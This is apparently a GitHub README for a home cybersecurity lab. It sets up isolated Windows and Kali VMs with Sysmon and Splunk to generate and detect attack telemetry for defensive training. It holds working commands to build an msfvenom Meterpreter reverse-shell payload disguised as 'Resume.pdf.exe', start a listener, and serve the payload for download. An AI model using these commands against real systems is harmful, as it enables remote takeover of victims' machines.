# Home Lab for Cybersecurity Research

This repository contains a structured home lab environment for analyzing malware behavior, testing security tools, and understanding telemetry data in a controlled, sandboxed setup. The goal is to simulate real-world attack scenarios and improve threat-hunting skills.

## 📌 Overview
This home lab allows:
- Safe execution of malware and tools in an isolated environment.
- Observing how attacks operate on targeted machines.
- Capturing and analyzing telemetry data using Sysmon and Splunk.
- Configuring an internal network to prevent external exposure.

## 🏗️ Virtual Environment Setup
### 1️⃣ Virtualization Software
Choose from one of the following:
- **VMware Workstation Pro** (Recommended)
- Microsoft Hyper-V
- Oracle VirtualBox
- Windows Sandbox

## 🔧 Setting Up Virtual Machines
### 🖥️ Windows OS Installation
1. Download Windows ISO using the [Media Creation Tool](https://www.microsoft.com/en-us/software-download/windows10).
2. Configure VM:
   - RAM: **2GB**
   - Storage: **60GB**
   - CPU: **1 Processor**
3. Complete the installation and take an initial **snapshot**.

### 🐧 Kali Linux Installation
1. Download the Kali Linux VM image from [Kali Downloads](https://www.kali.org/get-kali/#kali-virtual-machines).
2. Extract the `.7z` file using [7-Zip](https://7-zip.org/).
3. Configure VM:
   - RAM: **2GB** (Minimum)
   - Storage: **60GB**
   - CPU: **1 Processor**
4. Login Credentials:
   - Username: **kali**
   - Password: **kali**
5. Take a **snapshot** after installation.

## 🌐 Network Configuration
To ensure an isolated testing environment:
- Change network settings to **Internal Network** using **LAN Segment**.
- Assign **static IPs** to both Windows and Kali machines.

**Windows Static IP Setup:**
1. Navigate to: `Settings -> Network & Internet -> Change Adapter Options`
2. Configure IPv4 with:
   - IP: `192.168.X.X`
   - Subnet Mask: `/24 (255.255.255.0)`
   - Gateway: *Leave blank*

**Kali Linux Static IP Setup:**
1. Edit network connections and assign a static IP in the `192.168.X.X` range.
2. Confirm with `ifconfig`.
3. Test connectivity using `ping` between both machines.

## 🔍 Security Monitoring Tools Setup
### 📑 Install Sysmon for Windows Event Logging
1. Download [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Use a preconfigured [Sysmon Config File](https://github.com/Tagurkrishna/SOC-Automation-Project/blob/main/Sysmon-Install).
3. Install Sysmon using:
   ```powershell
   .\sysmon64.exe -i sysmonconfig.xml
   ```
4. Verify installation in:
   - **Windows Services** (`services.msc` → Find `Sysmon`)
   - **Event Viewer** (`Microsoft -> Windows -> Sysmon`)

### 📊 Install & Configure Splunk for Log Analysis
1. Download [Splunk Enterprise](https://www.splunk.com/en_us/download/splunk-enterprise.html) and install it.
2. Configure log ingestion:
   - Edit `inputs.conf` file:
     ```
     [WinEventLog://Microsoft-Windows-Sysmon/Operational]
     index = endpoint
     disabled = false
     renderXml = true
     source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
     ```
   - Restart Splunk services.
   - Create an index named **endpoint**.
3. Install **Splunk Add-on for Sysmon**.

## 🛠️ Attack Simulation: Generating Malware & Telemetry Data
### 🔥 Port Scanning with Nmap
1. On Kali, check available commands:
   ```bash
   nmap -h
   ```
2. Scan Windows OS:
   ```bash
   nmap -A "Windows_IP" -Pn
   ```
   - `-A`: Enables OS detection, version detection, and scripts.
   - `-Pn`: Skips ping check.

### 🦠 Creating Malware (Meterpreter Reverse Shell)
1. Generate a payload on Kali:
   ```bash
   msfvenom -p windows/x64/meterpreter_reverse_tcp lhost="Kali_IP" lport=4444 -f exe -o Resume.pdf.exe
   ```
2. Start Metasploit Framework:
   ```bash
   msfconsole
   ```
3. Set up a listener:
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter_reverse_tcp
   set lhost Kali_IP
   exploit
   ```
4. Host the malware for download:
   ```bash
   python3 -m http.server 9999
   ```
5. On Windows, download and execute the file.
6. Check active network connections:
   ```powershell
   netstat -anob
   ```

## 📊 Telemetry Analysis in Splunk
1. Search logs in Splunk:
   ```
   index=endpoint
   ```
2. Check Sysmon events:
   ```
   index=endpoint process guid
   | table _time,ParentImage,Image,CommandLine
   ```
3. Review telemetry logs and detect malicious activity.

## 🏁 Conclusion
This home lab provides a hands-on approach to understanding:
- Malware behavior and attack execution.
- Network isolation for security research.
- Detection and log analysis using Sysmon and Splunk.
- Real-world incident response techniques.

This setup can be extended to analyze different types of malware, test new security tools, and improve threat-hunting methodologies.

---
🔹 **Author:** [Tagurkrishna](https://github.com/Tagurkrishna)
🔹 **Portfolio Repository:** [SOC Automation Project](https://github.com/Tagurkrishna/SOC-Automation-Project)
